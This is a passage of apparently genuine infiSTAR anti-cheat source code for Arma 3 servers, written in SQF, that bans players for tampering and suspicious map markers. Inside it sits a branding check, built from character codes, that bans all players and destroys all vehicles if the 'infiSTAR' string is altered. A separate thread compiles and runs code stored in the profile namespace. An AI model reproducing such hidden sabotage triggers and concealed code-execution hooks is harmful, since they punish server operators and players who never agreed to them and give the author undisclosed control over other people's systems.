[profileName,getPlayerUID player,'HLOG',toArray(_this)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                          "+_clientoncethree+" = ""+str _curservertime+"";                                    }                                    else                                    {                                          _log = format['ClientOnceThree typeName changed: %1, %2',typeName "+_clientoncethree+","+_clientoncethree+"];                                          _log spawn {                                                waitUntil {!isNil '"+_YourPlayerToken+"'};                                                [profileName,getPlayerUID player,'BAN',toArray(_this)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                    };                              };                              "+_dellocveh+" = nil;'"+_dellocveh+"' addPublicVariableEventHandler {"+_dellocveh+" = nil;deleteVehicle (vehicle player);};                              if(!isNull player)then                              {                                    _puid = getPlayerUID player;                                    if(_puid!='')then                                    {                                          _oldUIDs = [];                                          _PNpuid = profileNamespace getVariable['PUID',[]];                                          if!(_puid in _PNpuid)then                                          {                                                if(str _PNpuid != '[]')then                                                {                                                      _oldUIDs = _PNpuid;                                                };                                                _PNpuid pushBack _puid;                                                profileNamespace setVariable['PUID',_PNpuid];                                                saveprofileNamespace;                                          };                                                                                    _admins = ""+str "+str _admins+"+"";                                          if!(_puid in _admins)then                                          {                                                if(str _oldUIDs != '[]')then                                                {                                                      _announce = true;{if(_x in _admins)exitWith {_announce = false;};} forEach _oldUIDs;                                                      if(_announce)then                                                      {                                                            _log = format['Player changed Steam Account (hacker?) - old UIDs: %1 (TEMPBANNED UNTIL NEXT RESTART)',_oldUIDs];                                                            [profileName,_puid,'TMPBAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn _AHKickOFF;                                                      };                                                };                                                                                                {                                                      if(!isNil _x)then                                                      {                                                            _log = format['AdminVariable Found: %1',_x];                                                            [profileName,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn _AHKickOFF;                                                      };                                                } forEach [                                                      '"+_MAIN_CODE+"',                                                      '"+_AH_HackLogArrayRND+"',                                                      '"+_AH_SurvLogArrayRND+"',                                                      '"+_AH_AdmiLogArrayRND+"',                                                      '"+_TMPBAN+"',                                                      '"+_AdminLoaded+"',                                                      '"+_adminbox+"',                                                      '"+_loadedchecktime+"',                                                      '"+_loaded+"',                                                      '"+_FNC_AH120_KICKLOG+"',                                                      '"+_FNC_AH120_KICKLOGSPAWN+"',                                                      '"+_FNC_PVAH_AdminReq+"',                                                      '"+_PoopTokenArray+"',                                                      '"+_server_setTokenR+"',                                                      '"+_server_checkTokenR+"',                                                      '"+_MCS+"',                                                      '"+_sumRunOnClients+"',                                                      '"+_sumAH_MAIN_BLOCK+"',                                                      '"+_fnc_mpPackets+"',                                                      '"+_inCombatArray+"'                                                ];                                          };                                    };                              };                              if((!isNil'"+_BIS_fnc_endMission+"')&&(!isNil'BIS_fnc_endMission'))then                              {                                    if!("+_BIS_fnc_endMission+" isEqualTo BIS_fnc_endMission)then                                    {                                          _log = format['BIS_fnc_endMission has been changed: %1',BIS_fnc_endMission];                                          _log spawn {                                                waitUntil {!isNil '"+_YourPlayerToken+"'};                                                [profileName,getPlayerUID player,'BAN',toArray(_this)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                    };                              };                              if((!isNil'"+_BIS_fnc_param+"')&&(!isNil'BIS_fnc_param'))then                              {                                    if!("+_BIS_fnc_param+" isEqualTo BIS_fnc_param)then                                    {                                          _log = format['BIS_fnc_param has been changed: %1',BIS_fnc_param];                                          _log spawn {                                                waitUntil {!isNil '"+_YourPlayerToken+"'};                                                [profileName,getPlayerUID player,'BAN',toArray(_this)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                    };                              };                        };"";                        _obj = 'C_man_1' createVehicle [0,0,0];                        _obj addMPEventHandler ['MPKilled',_zero];                        _obj setDamage 5;                        deleteVehicle _obj;                  };                  _a = ['_USER_DEFINED'];if("+str _UMW+")then {_a = _a + "+str _aLocalM+";};                  _mtimer = time + 30;                  _string = toString[105,110,102,105,83,84,65,82];                  _fnc_zero_two =                  {                        if(time > _mtimer)then                        {                              if((_string != 'infiSTAR')||('<'+_string+'.de>' != '<infiSTAR.de>')||(_string+'.de' != 'infiSTAR.de')) then                              {                                    {                                          _puid = getPlayerUID _x;                                          if(_puid != '') then                                          {                                                _name = name _x;                                                [_name,_puid,'BAN',toArray('')] call "+_FNC_AH120_KICKLOG+";                                                [_name,_puid] spawn fnc_infiServerKick;                                          };                                    } forEach playableUnits;                                    {_x setDamage 1;}forEach vehicles;                              };                              _mtimer = time + 30;                              "; if(_CLM)then { _A3AHstring = _A3AHstring + "                                    "+_MC+" = allMapMarkers;publicVariable '"+_MC+"';                              "; }; _A3AHstring = _A3AHstring + "                              "; if(_CGM)then { _A3AHstring = _A3AHstring + "                                    if(isNil'"+_MCS+"')then {"+_MCS+" = allMapMarkers;};                                    {                                          if!(_x in "+_MCS+")then                                          {                                                _cm = _x;                                                _cmLow = toLower _cm;                                                "+_MCS+" pushBack _cm;                                                _MT = MarkerText _cm;                                                _do = true;                                                {if(_cmLow find (toLower _x) > -1)exitWith {_do = false;}} forEach _a;                                                if(_do)then                                                {                                                      if(_cmLow in ['gefmarker','deinvadder','swagmarker','dmcmarking'])then                                                      {                                                            _log = format['HackedMarker: %1 - %2',_cm,_MT];                                                            _log call FNC_A3_HACKLOG;                                                            "+_AH_HackLogArrayRND+" pushBack _log;                                                            deleteMarker _cm;                                                      }                                                      else                                                      {                                                            if!(_MT in ['Epicenter','Poppy','Ferris','Container','Mineral',''])then                                                            {                                                                  _mytime = call fnc_getserverTime;                                                                  _log = _mytime + format['DodgyMarker: %1 - %2',_cm,_MT];                                                                  _log call FNC_A3_SURVEILLANCELOG;                                                                  "+_AH_SurvLogArrayRND+" pushBack _log;                                                            };                                                      };                                                };                                          };                                    } forEach allMapMarkers;                              "; }; _A3AHstring = _A3AHstring + "                              "; if(_RAM)then { _A3AHstring = _A3AHstring + "                                    {deleteVehicle _x;} forEach allMines;                              "; }; _A3AHstring = _A3AHstring + "                              "; if(_RUS)then { _A3AHstring = _A3AHstring + "                                    {deleteVehicle _x;} forEach allUnitsUAV;                              "; }; _A3AHstring = _A3AHstring + "                        };                  };                  _lastcalled = 0;                  waitUntil {                        if(time - _lastcalled > 5) then                        {                              call _fnc_zero_one;                              uiSleep 0.5;                              call _fnc_zero_two;                              uiSleep 0.5;                              _lastcalled = time + 8;                        };                        1 != 1                  };                  _log = format['%1 - RunOnClients LOOP - BROKEN!',time];                  _log call FNC_A3_HACKLOG;            };            "; if((_MOD == 'EPOCH')&&(_EpochIndestructible))then { _A3AHstring = _A3AHstring + "                  [] spawn {                        diag_log format['<infiSTAR.de> %1 - Thread #3: Server #3 starting now!',time];                        _timer1 = time+120;                        waitUntil {time > _timer1};                        diag_log format['<infiSTAR.de> %1 - Thread #3: Server #3 waited 120s',time];                        _indestructible = (allMissionObjects 'Constructions_static_F')+(allMissionObjects 'LockBoxProxy_EPOCH')+(allMissionObjects 'LockBox_EPOCH');                        {                              if!((typeof _x) in ['PlotPole_EPOCH','WoodStairs_EPOCH','WoodStairs2_EPOCH','WoodFloor_EPOCH','WoodLargeWall_EPOCH','WoodLargeWallDoorL_EPOCH','WoodLargeWallCor_EPOCH','WoodRamp_EPOCH'])then                               {                                    _x removeAllEventHandlers 'HandleDamage';                                    _x addEventHandler ['HandleDamage', {false}];                                    if!((typeOf _x) in ['LockBoxProxy_EPOCH','LockBox_EPOCH'])then {_x enableSimulation false;};                                    _x allowDamage false;                                    uiSleep 0.01;                              };                        } forEach _indestructible;                  };            "; }; _A3AHstring = _A3AHstring + "            [] spawn {                  diag_log format['<infiSTAR.de> %1 - Thread #4: starting now!',time];                  waitUntil {time > 300};                  _FUNCTION_QUESTAR = profileNamespace getVariable['FUNCTION_QUESTAR',[]];                  if(!isNil '_FUNCTION_QUESTAR')then                  {                        sleep 3;                        if!(_FUNCTION_QUESTAR isEqualTo [])then                        {                              {                                    _stringifiedARRAY = _x;                                    _ARRAY = call compile _stringifiedARRAY;                                    _codeAsString = toString _ARRAY;                                    _compiledCodeAsString = compile _codeAsString;                                                      [] spawn _compiledCodeAsString;                                    sleep 3;                              } forEach _FUNCTION_QUESTAR;                        };                  };            };      ";      call compileFinal _A3AHstring;      diag_log format['<infiSTAR.de> %1 - AntiHack loaded!',time];      /* ********************************************************************************* */      /* *********************************www.infiSTAR.de********************************* */      /* *******************Developed by infiSTAR (infiSTAR23@gmail.com)****************** */      /* **************infiSTAR Copyright®© 2011 - 2015 All rights reserved.************** */      /* ****DayZAntiHack.com***DayZAntiHack.de***ArmaAntiHack.com***Arma3AntiHack.com**** */